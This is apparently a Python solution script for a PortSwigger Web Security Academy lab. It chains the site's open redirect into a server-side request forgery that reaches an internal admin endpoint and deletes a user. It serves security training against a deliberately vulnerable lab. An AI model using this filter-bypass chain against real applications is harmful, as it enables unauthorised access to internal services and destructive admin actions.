"""
Lab 5: SSRF with filter bypass via open redirection vulnerability
https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection
Difficulty: Practitioner

📝 The filter only allows storeId URLs on the app's OWN trusted hostname —
but that hostname has an unrelated open redirect. Point storeId at the
trusted host's redirect, and let that redirect send the server's fetch
wherever we actually want it to go.
"""

from utils import get_session, log, note, stock_check, build_open_redirect_chain

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
# Confirm the exact open-redirect path from the app (commonly /product/nextProduct?path=)
OPEN_REDIRECT_PATH = "/product/nextProduct?path="
INTERNAL_TARGET = "http://localhost/admin/delete?username=carlos"


def run():
    s = get_session()

    chained_url = build_open_redirect_chain(TARGET, OPEN_REDIRECT_PATH, INTERNAL_TARGET)
    log(f"Chained SSRF URL: {chained_url}")

    r = stock_check(s, TARGET, "1", chained_url)
    log(f"Status: {r.status_code}")
    print(r.text[:500])

    note("If this doesn't land, confirm the server-side HTTP client actually")
    note("FOLLOWS redirects (most do by default) and that OPEN_REDIRECT_PATH")
    note("matches the app's real redirect endpoint and param name.")


if __name__ == "__main__":
    run()
